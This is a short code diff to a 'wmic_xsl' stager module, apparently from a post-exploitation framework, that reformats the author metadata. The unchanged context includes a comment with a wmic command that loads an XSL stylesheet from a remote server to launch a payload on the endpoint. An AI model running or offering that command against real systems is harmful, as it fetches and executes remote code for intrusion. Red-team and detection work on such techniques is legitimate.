@@ -10,7 +10,18 @@ class Stager(object):
 
         self.info = {
             "Name": "wmic_xsl",
-            "Authors": ["@subTee", "@mattifestation"],
+            "Authors": [
+                {
+                    "Name": "",
+                    "Handle": "@subTee",
+                    "Link": "",
+                },
+                {
+                    "Name": "Matt Graeber",
+                    "Handle": "@mattifestation",
+                    "Link": "https://twitter.com/mattifestation",
+                },
+            ],
             "Description": "Generates an XSL stylesheets file to be run with wmic.exe",
             "Comments": [
                 'On the endpoint simply launch wmic os get /format:"http://server/launcher.xsl"'
